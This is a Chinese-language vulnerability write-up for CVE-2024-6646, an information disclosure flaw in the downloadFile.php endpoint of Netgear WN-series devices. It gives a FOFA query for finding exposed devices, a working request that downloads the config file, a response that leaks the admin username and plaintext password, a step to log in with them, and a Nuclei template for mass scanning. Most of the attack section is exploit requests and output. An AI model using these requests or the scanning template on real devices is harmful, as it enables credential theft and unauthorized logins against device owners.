**漏洞名称**

Netgear Web 界面 downloadFile.php 信息泄露漏洞

**漏洞影响**

Netgear WN系列产品

首页如下 

**漏洞描述**

Netgear的WN系列产品存在一个漏洞，该漏洞存在于Web界面的某个未知功能中，影响文件为/downloadFile.php。通过操纵带有输入配置的参数文件，攻击者可以获取敏感信息。该攻击可能远程发起。

**FOFA搜索语句**

title=="Netgear"

**漏洞复现**

访问路径/downloadFile.php?file=config下载配置文件

下载后查看文件内容，发现其中包含了用户名密码

第三步，登录系统

完整POC数据包如下

```yaml
GET /downloadFile.php?file=config HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.69
Connection: close
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en


```

响应内容如下

```yaml

HTTP/1.1 200 OK
Connection: close
Content-Length: 16753
Cache-Control: must-revalidate, post-check=0, pre-check=0
Content-Description: File Transfer
Content-Disposition: attachment; filename=config
Content-Transfer-Encoding: binary
Content-Type: application/force-download
Date: Thu, 11 Jul 2024 02:11:21 GMT
Expires: 0
Pragma: public
Server: lighttpd/1.4.18
X-Lighttpd-Send-File: /var/config
X-Powered-By: PHP/4.4.0

system:configVersion 3.0
system:basicSettings t
system:basicSettings:apName netgear.io%3B
system:basicSettings:sysMacAddress 00-00-00-00-00-00
system:basicSettings:sysVersion 1.0
system:basicSettings:sysCountryRegion 233
system:basicSettings:adminName admin
system:basicSettings:adminPasswd viiraviira
system:basicSettings:dhcpClientStatus 0
system:basicSettings:ipAddr 192.168.2.11
system:basicSettings:netmaskAddr 255.255.255.0
```

**批量扫描POC**

```yaml
id: CVE-2024-6646

info:
  name: Netgear Web 界面 downloadFile.php 信息泄露漏洞
  author: fgz
  severity: high
  description: 'Netgear的WN系列产品存在一个漏洞，该漏洞存在于Web界面的某个未知功能中，影响文件为/downloadFile.php。通过操纵带有输入配置的参数文件，攻击者可以获取敏感信息。该攻击可能远程发起。'
  tags: 2023
  metadata:
    max-request: 3
    fofa-query: title=="Netgear"
    verified: true

http:
  - method: GET
    path:
      - "{{BaseURL}}/downloadFile.php?file=config"
    headers:
      Accept-Encoding: gzip, deflate
      Accept-Language: en
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && contains(body, 'adminPasswd')"
```

